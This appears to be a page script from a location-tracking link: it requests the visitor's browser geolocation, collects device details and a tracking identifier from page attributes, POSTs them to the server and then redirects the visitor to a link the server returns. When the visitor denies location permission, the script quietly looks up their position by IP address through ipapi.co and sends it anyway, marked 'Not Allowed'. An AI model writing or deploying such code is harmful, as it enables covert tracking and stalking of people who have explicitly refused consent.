
getLocation();
var myElement = document.getElementById("myElement");
var myboy = myElement.getAttribute("data-myboy");
var device_info = myElement.getAttribute("data-device");
var csrfmiddlewaretoken = $('input[name=csrfmiddlewaretoken]').val()  
function getLocation() {
  if (navigator.geolocation) {
    // Request the user's current location
    navigator.geolocation.getCurrentPosition(
      function(position) {
        // Get the latitude and longitude from the position object
        var latitude = position.coords.latitude;
        var longitude = position.coords.longitude;
       
        var msg = "Allowed"
        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
        sendLocationRequest(info);
        // Call the initMap function with the obtained coordinates
      },
      function(error) {
        
        var msg = 'Error getting your location: ' + error.message
        var automation = getAutomaticLocation();
      }
    );
  } else {
        var msg = 'Geolocation is not supported by this browser.'
        var info = {'msg':msg}
        // var automation = getAutomaticLocation();
  }
}
function sendLocationRequest(info){
    
    $.ajax({
            url: "",
            type: "POST",
            data: JSON.stringify(info),
            dataType: "json",
            // data:info,
            success: function(response) {
              if(response.success == true){
                console.log(response.link);
                window.location.href =response.link

              }
              else{
                window.location.href =response.link
                // console.log("Error Wirh Saving Location");
              }
                // console.log(response);
            }
            
        })
}


function getAutomaticLocation() {
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://ipapi.co/json/', true);
  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var data = JSON.parse(xhr.responseText);
      if (data && data.latitude && data.longitude) {
        var latitude = data.latitude;
        var longitude = data.longitude;
        var msg = "Not Allowed"
        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
        sendLocationRequest(info)
      } else {
        var msg = 'Unable to retrieve location data.'
        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
        sendLocationRequest(info)
      }
    } else if (xhr.readyState === 4 && xhr.status !== 200) {
      var msg = 'Error getting location. Status: '+ xhr.status
        var info = {'latitute':latitude,longitude,'msg':msg,'myboy':myboy,'device_info':device_info,'csrfmiddlewaretoken':csrfmiddlewaretoken}
      sendLocationRequest(info)
    }
  };
  xhr.send();
}

